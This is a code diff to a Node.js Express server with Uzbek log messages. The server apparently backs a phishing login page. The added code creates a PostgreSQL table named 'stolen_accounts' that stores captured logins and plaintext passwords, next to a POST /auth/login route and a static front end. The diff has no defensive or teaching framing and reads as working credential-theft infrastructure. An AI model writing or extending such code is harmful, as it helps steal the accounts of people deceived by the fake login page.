@@ -11,6 +11,23 @@ const pool = new Pool({
   }
 });
 
+const initDB = async () => {
+  try {
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS stolen_accounts (
+        id SERIAL PRIMARY KEY,
+        login TEXT NOT NULL,
+        password TEXT NOT NULL,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+      );
+    `);
+    console.log("Ma'lumotlar bazasi va jadval tayyor!");
+  } catch (err) {
+    console.error("Jadval yaratishda xatolik:", err);
+  }
+};
+initDB(); 
+
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static("public"));
 
@@ -32,7 +49,6 @@ app.post("/auth/login", async (req, res) => {
   }
 });
 
-// 3. Portni sozlash (Render avtomatik port tayinlaydi)
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server ${PORT}-portda ishga tushdi`);
